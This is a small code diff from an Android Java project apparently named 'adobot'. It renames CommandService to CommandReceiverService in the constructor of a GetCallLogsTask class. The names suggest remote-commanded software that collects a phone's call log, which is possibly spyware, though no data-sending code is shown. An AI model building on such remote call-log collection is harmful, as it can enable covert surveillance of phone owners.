@@ -8,7 +8,7 @@ import android.provider.CallLog;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
+import com.android.adobot.CommandReceiverService;
 import com.android.adobot.CommonParams;
 
 import java.text.SimpleDateFormat;
@@ -25,7 +25,7 @@ public class GetCallLogsTask extends BaseTask {
     private CommonParams commonParams;
     private int numlogs;
 
-    public GetCallLogsTask(CommandService client, int numlogs) {
+    public GetCallLogsTask(CommandReceiverService client, int numlogs) {
         setContext(client);
         this.numlogs = numlogs;
         this.commonParams = new CommonParams(client);
